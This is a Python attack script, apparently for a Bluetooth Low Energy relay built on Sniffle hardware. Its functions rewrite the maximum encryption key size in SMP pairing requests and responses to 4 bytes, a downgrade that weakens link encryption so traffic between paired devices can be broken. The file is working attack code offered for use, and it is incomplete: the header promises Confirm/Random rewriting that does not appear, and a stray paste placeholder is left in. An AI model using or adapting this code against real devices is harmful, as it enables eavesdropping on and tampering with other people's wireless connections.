# SPDX-License-Identifier: GPL-3.0-or-later
# smp_confirm_bridge.py — rewrite SMP Confirm/Random so pairing succeeds after key-size downgrade.
#
# Requires: PyCryptodome (pip install pycryptodome)
#
# Works for LE Legacy, Just Works (TK = 0…0). If you use Passkey/OOB, set TK accordingly.





# ...paste your code exactly as you posted...

# --- constants we use ---
_SMP_CID = 0x0006
_SMP_PAIRING_REQ = 0x01
_SMP_PAIRING_RSP = 0x02

def _rewrite_ll_l2cap_smp(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  full LL 'body' (starts at LL header byte 0x..: LLID|NESN|SN|MD, then length, then payload)
    Output: (modified_ll_body: bytes, changed: bool)

    Rewrites SMP Pairing Req/Resp MaxEncryptionKeySize (1 byte) to new_key_size.
    Only triggers on: LLID=start-of-L2CAP, CID=0x0006, SMP Code in {0x01, 0x02}.
    """
    if len(ll_body) < 4:
        return ll_body, False

    llid = ll_body[0] & 0x03
    length = ll_body[1]
    # must have the whole payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return ll_body, False

    # L2CAP header starts at offset 2
    l2cap = bytearray(ll_body[2:2+length])
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # must be SMP CID and enough payload for Pairing Req/Rsp (len >= 7)
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return ll_body, False

    smp = bytearray(l2cap[4:4+l2len])
    smp_code = smp[0]
    if smp_code not in (_SMP_PAIRING_REQ, _SMP_PAIRING_RSP):
        return ll_body, False

    # Byte 4 of SMP Pairing Req/Rsp is Max Encryption Key Size
    if smp[4] == new_key_size:
        return ll_body, False  # nothing to change

    smp[4] = new_key_size
    l2cap[4:4+l2len] = smp

    # Reassemble LL body: [hdr,len] + L2CAP(payload)
    new_ll = bytearray(ll_body)
    new_ll[2:2+length] = l2cap  # length unchanged
    return bytes(new_ll), True


def  downgrade_pairing_response(packet_bytes: bytes, new_key_size: int = 0x04):
    """
    Input:  'PACKET' message body from relay_slave -> relay_master:
            [event_le16][LL body ...]
    Output: (modified_packet_bytes, changed: bool)
    """
    if len(packet_bytes) < 4:
        return packet_bytes, False
    event = packet_bytes[:2]
    ll_body = packet_bytes[2:]
    ll_body2, changed = _rewrite_ll_l2cap_smp(ll_body, new_key_size)
    return (event + ll_body2), changed


def downgrade_pairing_request(ll_body: bytes, new_key_size: int = 0x04):
    """
    Input:  msg.body from SniffleHW (full LL body)
    Output: (modified_ll_body, changed: bool)
    """
    return _rewrite_ll_l2cap_smp(ll_body, new_key_size)

